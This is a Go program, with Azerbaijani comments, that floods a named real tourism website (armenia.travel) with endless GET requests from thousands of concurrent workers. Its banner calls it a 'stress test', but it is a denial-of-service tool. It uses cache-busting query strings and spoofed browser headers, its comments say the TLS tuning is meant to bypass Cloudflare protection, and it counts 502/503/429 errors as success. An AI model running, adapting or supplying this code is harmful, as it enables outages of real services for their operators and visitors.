package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

func main() {
	target := "https://armenia.travel"
	workers := 2000 // Railway-də resurs varsa 4000-ə qaldırın

	fmt.Printf("[!] LALAFO-STRESS TEST BAŞLAYIR: %s\n", target)

	// Cloudflare Enterprise qorumasını keçmək üçün TLS barmaq izi tənzimləməsi
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		},
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 5000,
	}

	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				u := fmt.Sprintf("%s/?_ts=%d&s=%d", target, time.Now().UnixNano(), rand.Int())
				
				req, _ := http.NewRequest("GET", u, nil)

				// Real Chrome 120+ Headers
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
				req.Header.Set("Accept-Language", "az-AZ,az;q=0.9,en-US;q=0.8,en;q=0.7")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"")
				req.Header.Set("Sec-Fetch-Mode", "navigate")
				req.Header.Set("Cache-Control", "no-cache")

				resp, err := client.Do(req)
				if err == nil {
					// Lalafodan 502/503/429 gəlməsi böyük uğurdur
					if resp.StatusCode != 200 {
						fmt.Printf("[HIT-%d] Status: %d\n", id, resp.StatusCode)
					}
					resp.Body.Close()
				}
				// Gecikməni minimuma salırıq
			}
		}(i)
	}
	wg.Wait()
}
